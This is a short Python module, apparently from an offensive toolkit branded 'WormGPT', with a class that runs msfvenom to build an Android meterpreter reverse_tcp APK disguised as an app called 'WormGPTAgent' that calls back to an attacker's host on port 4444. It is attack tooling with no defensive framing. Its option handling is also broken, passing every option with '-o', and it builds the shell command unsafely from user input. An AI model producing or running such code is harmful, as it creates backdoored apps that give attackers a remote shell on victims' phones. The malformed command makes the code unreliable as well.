import os
import subprocess
from core.config_manager import ConfigManager

class MetasploitIntegrator:
    def __init__(self, config_manager: ConfigManager):
        self.config = config_manager

    def generate_apk_payload(self, exploit_type: str, lhost: str):
        """
        Uses Metasploit to generate an APK payload.
        Requires msfvenom to be installed and in PATH.
        """
        print(f"Generating {exploit_type} payload against {lhost}...")
        
        # Common payload for Android
        payload = "android/meterpreter/reverse_tcp"
        options = {
            'LHOST': lhost,
            'LPORT': 4444,
            'AppName': 'WormGPTAgent',
            'Package': 'com.wormgpt.agent'
        }
        
        cmd = f"msfvenom -p {payload} "
        for k, v in options.items():
            cmd += f"-o {k} {v} "
        
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                print("Payload generated successfully.")
                return result.stdout.splitlines()[-1] # Return output path
            else:
                print(f"Metasploit Error: {result.stderr}")
        except FileNotFoundError:
            print("msfvenom not found. Please install Metasploit Framework.")
        return None